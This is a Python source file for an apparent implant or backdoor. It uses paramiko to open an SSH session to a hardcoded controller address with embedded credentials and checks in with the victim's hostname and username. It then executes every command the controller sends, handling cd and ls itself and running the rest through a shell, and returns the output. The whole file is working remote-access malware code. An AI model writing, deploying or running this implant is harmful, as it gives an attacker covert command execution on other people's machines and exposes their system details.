import paramiko
import subprocess
import sys
import os
import socket
import getpass

def shhComm():
    ip = '127.0.0.1'
    port = 2222
    username = 'sshuser1'
    password = '$$#pa55'
    
    SHH = paramiko.SSHClient()
    SHH.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        SHH.connect(ip, port=port, username=username, password=password)
        openSession = SHH.get_transport().open_session()
        hostName = socket.gethostname() 
        currentUser = getpass.getuser()
        
        if openSession.active:
            openSession.send(f'Implant checked in from {hostName} as {currentUser}.\n'.encode())
            print(openSession.recv(1024).decode())
            
            while True:
                command = openSession.recv(1024)
                if not command:
                    break
                
                shhCommand = command.decode().strip()
                if not shhCommand:
                    continue

                if shhCommand == 'exit':
                    break

                # 1. Directory Navigation (cd)
                if shhCommand.startswith('cd'):
                    parts = shhCommand.split(maxsplit=1)
                    if len(parts) > 1:
                        try:
                            os.chdir(parts[1])
                            openSession.send(f"Changed directory to: {os.getcwd()}\n".encode())
                        except Exception as err:
                            openSession.send(f"cd failed: {str(err)}\n".encode())
                    else:
                        openSession.send(f"Current directory: {os.getcwd()}\n".encode())

                # 2. Native Directory Listing (ls)
                elif shhCommand == 'ls' or shhCommand.startswith('ls '):
                    parts = shhCommand.split(maxsplit=1)
                    target_dir = parts[1] if len(parts) > 1 else os.getcwd()
                    
                    try:
                        files = os.listdir(target_dir)
                        output = "\n".join(files) + "\n" if files else "Directory is empty.\n"
                        openSession.send(output.encode())
                    except Exception as err:
                        openSession.send(f"ls failed: {str(err)}\n".encode())

                # 3. Fallback System Shell Execution
                else:
                    try:
                        shhCommandOutput = subprocess.check_output(
                            shhCommand, 
                            stderr=subprocess.STDOUT, 
                            shell=True
                        )
                        openSession.send(shhCommandOutput)
                    except subprocess.CalledProcessError as e:
                        openSession.send(e.output if e.output else b"Command execution failed.\n")
                    except Exception as err:
                        openSession.send(f"Execution error: {str(err)}\n".encode())
                    
    except KeyboardInterrupt:
        if 'openSession' in locals() and openSession.active:
            openSession.send(b"Session interrupted by user.\n")
    except Exception as e:
        print(f"Connection error: {e}")
    finally:
        SHH.close()

if __name__ == '__main__':
    shhComm()